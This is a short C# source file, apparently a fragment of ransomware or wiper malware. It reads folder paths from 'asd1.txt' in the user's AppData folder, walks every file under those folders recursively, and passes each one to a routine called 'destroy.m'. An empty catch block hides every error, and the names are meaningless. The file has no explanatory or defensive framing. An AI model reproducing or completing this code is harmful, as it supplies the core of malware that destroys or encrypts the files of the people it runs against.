using System;
using System.IO;

public class wafaa
{
	public static void salma()
	{
		string[] array = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd1.txt");
		string[] array2 = array;
		foreach (string path in array2)
		{
			try
			{
				string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
				string[] array3 = files;
				foreach (string gfggfdfdf in array3)
				{
					destroy.m(gfggfdfdf);
				}
			}
			catch
			{
			}
		}
	}
}
